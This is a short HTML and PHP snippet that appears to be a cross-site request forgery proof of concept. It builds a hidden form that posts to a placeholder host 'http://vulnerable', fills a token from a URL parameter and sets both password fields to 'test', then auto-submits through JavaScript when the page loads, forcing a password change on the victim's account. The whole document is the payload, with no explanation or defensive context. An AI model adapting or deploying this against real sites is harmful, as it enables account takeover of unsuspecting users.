<form name="send" action="http://vulnerable" method="POST" >
    <input type="hidden" name="token" value="<?php $token=$_GET['c']; print $token; ?>"/>
    <input type="hidden" name="password" value="test" />
    <input type="hidden" name="password_again" value="test" />
    <script type="text/javascript" language="JavaScript">
        document.send.submit();
    </script>
</form>
